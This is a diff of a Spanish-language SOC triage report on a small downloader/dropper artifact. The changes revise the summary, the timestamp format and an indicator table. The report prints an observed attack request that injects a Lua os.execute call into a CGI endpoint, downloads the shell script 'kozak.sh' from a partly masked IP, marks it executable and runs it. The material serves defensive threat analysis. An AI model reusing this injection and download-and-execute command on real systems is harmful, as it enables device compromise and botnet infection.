@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 298 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `kozak.sh` en `hxxp://45.202.246.XXX/bins/kozak.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -14,7 +15,7 @@ Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia dis
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T20:45:19+00:00`
+- **Registrado:** `2026-08-09T20:45:19.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -52,11 +53,11 @@ GET /cgi-bin/lua?cmd=os.execute("wget%20-O%20/tmp/kozak.sh%20http://45.202.246.X
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 190.179.166.XXX | static_analysis |
-| ip | 45.202.246.XXX | static_analysis |
 | url | hxxp://45.202.246.XXX/bins/kozak.sh;%20chmod%20+x%20/tmp/kozak.sh;%20/tmp/kozak.sh%20 | strings |
-| hash | 7f8e8ddd1997937aaf22289dbfabcbbcb46f751c29c902fc25bc6c63b9bea511 | static_analysis |
+| ip | 45.202.246.XXX | static_analysis |
+| ip | 190.179.166.XXX | static_analysis |
 | command | GET /cgi-bin/lua?cmd=os.execute("wget%20-O%20/tmp/kozak.sh%20http://45.202.246.XXX/bins/kozak.sh;%20chmod%20+x%20/tmp/ko | strings |
+| hash | 7f8e8ddd1997937aaf22289dbfabcbbcb46f751c29c902fc25bc6c63b9bea511 | static_analysis |
 | ip | 64.89.162.XXX | artifact_source |
 
 ## 🔎 Triage
